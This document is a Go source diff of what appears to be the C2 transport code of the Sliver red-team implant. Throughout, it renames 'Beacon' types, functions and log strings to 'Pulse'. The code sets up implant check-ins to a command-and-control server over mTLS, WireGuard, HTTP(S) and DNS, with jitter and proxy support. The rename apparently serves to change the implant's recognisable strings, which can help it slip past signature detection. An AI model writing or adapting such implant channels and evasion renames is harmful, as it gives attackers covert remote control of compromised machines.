@@ -18,7 +18,7 @@ package transports
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .Config.IsBeacon}}
+// {{if .Config.IsPulse}}
 
 import (
 	"io"
@@ -75,38 +75,38 @@ var (
 	_ io.Writer
 )
 
-type BeaconInit func() error
-type BeaconStart func() error
-type BeaconRecv func() (*pb.Envelope, error)
-type BeaconSend func(*pb.Envelope) error
-type BeaconClose func() error
-type BeaconCleanup func() error
+type PulseInit func() error
+type PulseStart func() error
+type PulseRecv func() (*pb.Envelope, error)
+type PulseSend func(*pb.Envelope) error
+type PulseClose func() error
+type PulseCleanup func() error
 
-// Beacon - Abstract connection to the server
-type Beacon struct {
-	Init    BeaconInit
-	Start   BeaconStart
-	Send    BeaconSend
-	Recv    BeaconRecv
-	Close   BeaconClose
-	Cleanup BeaconCleanup
+// Pulse - Abstract connection to the server
+type Pulse struct {
+	Init    PulseInit
+	Start   PulseStart
+	Send    PulseSend
+	Recv    PulseRecv
+	Close   PulseClose
+	Cleanup PulseCleanup
 
 	ActiveC2 string
 	ProxyURL string
 }
 
-// Interval - Interval between beacons
-func (b *Beacon) Interval() int64 {
+// Interval - Interval between pulses
+func (b *Pulse) Interval() int64 {
 	return GetInterval()
 }
 
-// Jitter - Jitter between beacons
-func (b *Beacon) Jitter() int64 {
+// Jitter - Jitter between pulses
+func (b *Pulse) Jitter() int64 {
 	return GetJitter()
 }
 
 // Duration - Interval + random value <= Jitter
-func (b *Beacon) Duration() time.Duration {
+func (b *Pulse) Duration() time.Duration {
 	// {{if .Config.Debug}}
 	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
 	// {{end}}
@@ -121,20 +121,20 @@ func (b *Beacon) Duration() time.Duration {
 	return duration
 }
 
-// StartBeaconLoop - Starts the beacon loop generator
-func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
+// StartPulseLoop - Starts the pulse loop generator
+func StartPulseLoop(abort <-chan struct{}) <-chan *Pulse {
 	// {{if .Config.Debug}}
-	log.Printf("Starting beacon loop ...")
+	log.Printf("Starting pulse loop ...")
 	// {{end}}
 
-	var beacon *Beacon
-	nextBeacon := make(chan *Beacon)
+	var pulse *Pulse
+	nextPulse := make(chan *Pulse)
 
 	innerAbort := make(chan struct{})
 	c2Generator := C2Generator(innerAbort)
 
 	go func() {
-		defer close(nextBeacon)
+		defer close(nextPulse)
 		defer func() {
 			innerAbort <- struct{}{}
 		}()
@@ -152,25 +152,25 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 			// *** MTLS ***
 			// {{if .Config.IncludeMTLS}}
 			case "mtls":
-				beacon = mtlsBeacon(uri)
+				pulse = mtlsPulse(uri)
 				// {{end}}  - IncludeMTLS
 			case "wg":
 				// *** WG ***
 				// {{if .Config.IncludeWG}}
-				beacon = wgBeacon(uri)
+				pulse = wgPulse(uri)
 				// {{end}}  - IncludeWG
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
 				// {{if .Config.IncludeHTTP}}
-				beacon = httpBeacon(uri)
+				pulse = httpPulse(uri)
 				// {{end}} - IncludeHTTP
 
 			case "dns":
 				// *** DNS ***
 				// {{if .Config.IncludeDNS}}
-				beacon = dnsBeacon(uri)
+				pulse = dnsPulse(uri)
 				// {{end}} - IncludeDNS
 
 			default:
@@ -179,20 +179,20 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 				// {{end}}
 			}
 			select {
-			case nextBeacon <- beacon:
+			case nextPulse <- pulse:
 			case <-abort:
 				return
 			}
 		}
 	}()
 
-	return nextBeacon
+	return nextPulse
 }
 
 // {{if .Config.IncludeMTLS}}
-func mtlsBeacon(uri *url.URL) *Beacon {
+func mtlsPulse(uri *url.URL) *Pulse {
 	// {{if .Config.Debug}}
-	log.Printf("Beacon -> %s", uri.String())
+	log.Printf("Pulse -> %s", uri.String())
 	// {{end}}
 	var err error
 	lport, err := strconv.Atoi(uri.Port())
@@ -202,7 +202,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 
 	var conn *tls.Conn
 	var muxSession *yamux.Session
-	beacon := &Beacon{
+	pulse := &Pulse{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
@@ -288,15 +288,15 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 		},
 	}
 
-	return beacon
+	return pulse
 }
 
 // {{end}}
 
 // {{if .Config.IncludeWG}}
-func wgBeacon(uri *url.URL) *Beacon {
+func wgPulse(uri *url.URL) *Pulse {
 	// {{if .Config.Debug}}
-	log.Printf("Establishing Beacon -> %s", uri.String())
+	log.Printf("Establishing Pulse -> %s", uri.String())
 	// {{end}}
 	lport, err := strconv.Atoi(uri.Port())
 	if err != nil {
@@ -306,7 +306,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 	var conn net.Conn
 	var dev *device.Device
 	var muxSession *yamux.Session
-	beacon := &Beacon{
+	pulse := &Pulse{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
@@ -325,7 +325,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 				return err
 			}
 			if _, err := conn.Write([]byte(wireguard.YamuxPreface)); err != nil {
-				closeWGBeaconResources(nil, conn, dev)
+				closeWGPulseResources(nil, conn, dev)
 				conn = nil
 				dev = nil
 				return err
@@ -340,7 +340,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 			// {{end}}
 			muxSession, err = yamux.Client(conn, cfg)
 			if err != nil {
-				closeWGBeaconResources(nil, conn, dev)
+				closeWGPulseResources(nil, conn, dev)
 				conn = nil
 				dev = nil
 				return err
@@ -356,10 +356,10 @@ func wgBeacon(uri *url.URL) *Beacon {
 			return wireguard.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
-			return sendWGBeaconEnvelope(muxSession, envelope)
+			return sendWGPulseEnvelope(muxSession, envelope)
 		},
 		Close: func() error {
-			closeWGBeaconResources(muxSession, conn, dev)
+			closeWGPulseResources(muxSession, conn, dev)
 			muxSession = nil
 			conn = nil
 			dev = nil
@@ -369,13 +369,13 @@ func wgBeacon(uri *url.URL) *Beacon {
 			return nil
 		},
 	}
-	return beacon
+	return pulse
 }
 
-// closeWGBeaconResources permanently closes each per-check-in resource. A
+// closeWGPulseResources permanently closes each per-check-in resource. A
 // device.Down only stops the bind and peers; it leaves the netstack TUN and
-// WireGuard worker goroutines alive, so beacon reconnects must use Close.
-func closeWGBeaconResources(muxSession *yamux.Session, conn net.Conn, dev *device.Device) {
+// WireGuard worker goroutines alive, so pulse reconnects must use Close.
+func closeWGPulseResources(muxSession *yamux.Session, conn net.Conn, dev *device.Device) {
 	if muxSession != nil {
 		_ = muxSession.Close()
 	}
@@ -383,37 +383,37 @@ func closeWGBeaconResources(muxSession *yamux.Session, conn net.Conn, dev *devic
 		_ = conn.Close()
 	}
 	if dev != nil {
-		closeWGBeaconDevice(dev.Close)
+		closeWGPulseDevice(dev.Close)
 	}
 }
 
-func closeWGBeaconDevice(closeDevice func()) {
+func closeWGPulseDevice(closeDevice func()) {
 	if closeDevice != nil {
 		closeDevice()
 	}
 }
 
-const wgBeaconStreamReceiptTimeout = 5 * time.Second
+const wgPulseStreamReceiptTimeout = 5 * time.Second
 
-func sendWGBeaconEnvelope(muxSession *yamux.Session, envelope *pb.Envelope) error {
+func sendWGPulseEnvelope(muxSession *yamux.Session, envelope *pb.Envelope) error {
 	if envelope == nil {
-		return errors.New("[wg] nil beacon envelope")
+		return errors.New("[wg] nil pulse envelope")
 	}
-	return sendWGBeaconStream(muxSession, wgBeaconStreamReceiptTimeout, func(stream net.Conn) error {
+	return sendWGPulseStream(muxSession, wgPulseStreamReceiptTimeout, func(stream net.Conn) error {
 		return wireguard.WriteEnvelope(stream, envelope)
 	})
 }
 
-// sendWGBeaconStream waits for the peer's FIN after writing the request. A
+// sendWGPulseStream waits for the peer's FIN after writing the request. A
 // successful yamux write only means the frame reached the local transport; the
-// remote FIN proves the server read the complete request before the beacon
+// remote FIN proves the server read the complete request before the pulse
 // tears down the WireGuard session.
-func sendWGBeaconStream(muxSession *yamux.Session, receiptTimeout time.Duration, write func(net.Conn) error) error {
+func sendWGPulseStream(muxSession *yamux.Session, receiptTimeout time.Duration, write func(net.Conn) error) error {
 	if muxSession == nil {
 		return errors.New("[wg] send called with nil yamux session")
 	}
 	if receiptTimeout <= 0 {
-		return errors.New("[wg] invalid beacon stream receipt timeout")
+		return errors.New("[wg] invalid pulse stream receipt timeout")
 	}
 	stream, err := muxSession.Open()
 	if err != nil {
@@ -440,23 +440,23 @@ func sendWGBeaconStream(muxSession *yamux.Session, receiptTimeout time.Duration,
 // {{end}}
 
 // {{if .Config.IncludeHTTP}}
-func httpBeacon(uri *url.URL) *Beacon {
+func httpPulse(uri *url.URL) *Pulse {
 
 	// {{if .Config.Debug}}
-	log.Printf("Beaconing -> %s", uri)
+	log.Printf("Pulseing -> %s", uri)
 	// {{end}}
 
 	var client *httpclient.SliverHTTPClient
 	var err error
 	opts := httpclient.ParseHTTPOptions(uri)
-	beacon := &Beacon{
+	pulse := &Pulse{
 		ActiveC2: uri.String(),
 		ProxyURL: opts.ProxyConfig,
 		Init: func() error {
 			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] http(s) connection error %s", err)
+				log.Printf("[pulse] http(s) connection error %s", err)
 				// {{end}}
 				return err
 			}
@@ -479,23 +479,23 @@ func httpBeacon(uri *url.URL) *Beacon {
 		},
 	}
 
-	return beacon
+	return pulse
 }
 
 // {{end}}
 
 // {{if .Config.IncludeDNS}}
-func dnsBeacon(uri *url.URL) *Beacon {
+func dnsPulse(uri *url.URL) *Pulse {
 	var client *dnsclient.SliverDNSClient
 	var err error
-	beacon := &Beacon{
+	pulse := &Pulse{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
 			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[beacon] dns connection error %s", err)
+				log.Printf("[pulse] dns connection error %s", err)
 				// {{end}}
 				return err
 			}
@@ -517,9 +517,9 @@ func dnsBeacon(uri *url.URL) *Beacon {
 			return client.CloseSession()
 		},
 	}
-	return beacon
+	return pulse
 }
 
 // {{end}} - IncludeDNS
 
-// {{end}} - IsBeacon
+// {{end}} - IsPulse
